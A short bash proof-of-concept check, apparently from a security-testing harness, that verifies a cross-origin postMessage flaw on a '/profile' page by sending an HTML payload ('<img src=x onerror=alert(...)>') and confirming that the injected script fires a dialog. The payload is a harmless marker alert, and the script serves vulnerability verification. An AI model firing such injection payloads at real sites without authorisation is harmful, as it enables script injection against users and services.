#!/usr/bin/env bash
# POSTMSG-001 (CWE-346/79): the widget bridge on /profile accepts a message from
# any origin and renders its payload as HTML. A fired dialog proves the injected
# script ran; the in-page wait lets React flush and the image fail first.
set -e; . "$(dirname "$0")/_lib.sh"
M="POSTMSG-PROVEN-7f3a"
JS="window.postMessage({type:'taskflow:notice',html:\"<img src=x onerror=alert('$M')>\"},'*'); await new Promise(function(r){setTimeout(r,1500);}); return 'sent';"
browser_dialog "$TARGET/profile" "$M" --eval "$JS"
